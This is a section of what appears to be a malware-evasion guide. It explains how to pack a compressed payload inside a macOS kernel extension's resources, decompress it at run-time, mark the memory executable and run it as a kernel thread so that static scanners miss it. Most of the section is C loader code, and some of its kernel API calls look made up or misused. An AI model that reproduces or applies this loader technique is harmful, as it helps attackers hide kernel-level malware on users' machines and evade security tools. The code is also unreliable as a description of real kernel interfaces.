## 8.  Packing the Whole Kext as a Resource Bundle

macOS allows a kext to ship **auxiliary resources** (e.g., a compressed payload) inside the bundle’s `Contents/Resources` directory.  The driver can load the resource at run‑time, decompress it, and then **execute it as a separate kernel thread**.  The original kext’s binary then appears innocent.

### 8.1  Example – loading a compressed payload

```c
#include <IOKit/IOLib.h>
#include <IOKit/IOKitKeys.h>
#include <IOKit/IOKitDebug.h>
#include <libkern/OSKextLib.h>

static OSData *load_compressed_payload(void)
{
    OSString *path = OSString::withCString("Contents/Resources/payload.bin.gz");
    if (!path) return nullptr;

    OSData *blob = OSKext::loadKextResource(path);
    path->release();
    return blob;          // may be nullptr if the resource is missing
}

/* Decompress using zlib (the kernel has a subset compiled in) */
static void *decompress_payload(OSData *compressed, size_t *outSize)
{
    // Very simplified – error handling omitted for brevity.
    const uint8_t *src = (const uint8_t *)compressed->getBytesNoCopy();
    size_t srcLen = compressed->getLength();

    // Assume we know the final size (or store it in the first 4 bytes)
    *outSize = *(uint32_t *)src;         // first dword = uncompressed size
    void *dst = IOMalloc(*outSize);
    int rc = zlib_inflate(src + 4, srcLen - 4, dst, *outSize);
    return (rc == Z_OK) ? dst : nullptr;
}

/* Run the payload as a kernel thread */
static void payload_thread(void *arg, wait_result_t wait)
{
    size_t sz;
    OSData *cblob = load_compressed_payload();
    if (!cblob) return;

    void *code = decompress_payload(cblob, &sz);
    cblob->release();
    if (!code) return;

    /* Mark the memory executable */
    vm_offset_t addr = (vm_offset_t)code;
    vm_protect(kernel_map, addr, sz,
               FALSE, VM_PROT_READ|VM_PROT_WRITE|VM_PROT_EXECUTE);

    /* Jump to the entry – payload is expected to be a function of type void(void *) */
    typedef void (*payload_entry_t)(void *);
    payload_entry_t entry = (payload_entry_t)code;
    entry(NULL);        // payload runs now
    IOFree(code, sz);
}

/* ---------------------------------------------------------- */
static kern_return_t MyKextStart(void)
{
    thread_t th;
    kern_return_t kr = kernel_thread_start(payload_thread, NULL, &th);
    if (kr != KERN_SUCCESS)
        IOLog("Failed to start payload thread: %d\n", kr);
    return KERN_SUCCESS;
}
```

*Result*: The *on‑disk* kext file looks like any ordinary driver, but the **malicious payload lives only after being decompressed and marked executable at run‑time**.  A static scanner that only looks at `.text` will miss it entirely.

